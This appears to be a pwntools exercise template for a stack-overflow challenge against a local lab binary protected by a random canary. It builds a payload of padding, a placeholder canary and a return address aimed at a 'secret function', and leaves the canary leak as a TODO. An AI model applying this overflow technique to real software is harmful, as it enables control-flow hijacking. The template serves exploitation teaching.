"""
Challenge 4: Exploit a binary protected with a random canary

TEAMPLATE
"""

from pwn import *

context.update(arch='i386', os='linux')
pty = process.PTY
elf = context.binary = ELF("./binaries/binary-5-SG12-random")
p = process(elf.path)

print("Get the canary")
# TODO:
#       Check the source code
#       Grab a fork ;)
#       Get the canary
random_canary = p32(0x12345678)

print("Craft payload")
address_of_secret_function = 0x80486c0
buffer_size = 80
offset_canary = 4
fscan_terminator_symbol = b'\x09'

payload = b'A'*(buffer_size+offset_canary) + random_canary + \
    p32(address_of_secret_function) + fscan_terminator_symbol
print("Send " + str(payload))
p.sendline(payload)

print(p.recvline())
